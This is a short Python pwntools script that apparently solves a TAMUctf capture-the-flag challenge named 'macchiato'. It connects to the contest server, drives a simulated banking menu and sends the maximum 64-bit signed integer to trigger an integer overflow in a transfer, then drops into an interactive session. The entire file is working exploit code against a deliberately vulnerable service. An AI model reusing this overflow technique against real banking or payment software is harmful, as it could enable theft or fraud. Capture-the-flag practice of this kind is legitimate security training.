from pwn import *

def checkAcct():
	for i in range(10):
		print("account number: "+str(i))
		p.sendline(b'1')
		p.sendline(str(i).encode())
		p.recv()

p = remote("tamuctf.com", 443, ssl=True, sni="macchiato")
#p.interactive()
p.sendline(b'1')
p.sendline(b'RegularBank')
p.sendline(b'someoneElse')
p.sendline(b'2')
#checkAcct()
#p.interactive()

p.sendline(b'2')
p.sendline(b'0')
p.sendline(b'9223372036854775807')
p.sendline(b'2')
p.sendline(b'0')
p.sendline(b'2')
#p.interactive()
p.sendline(b'3')
p.sendline(b'3')
p.sendline(b'1')
p.sendline(b'BlazinglyFastBank')
p.sendline(b'me')
p.sendline(b'1')

p.interactive()
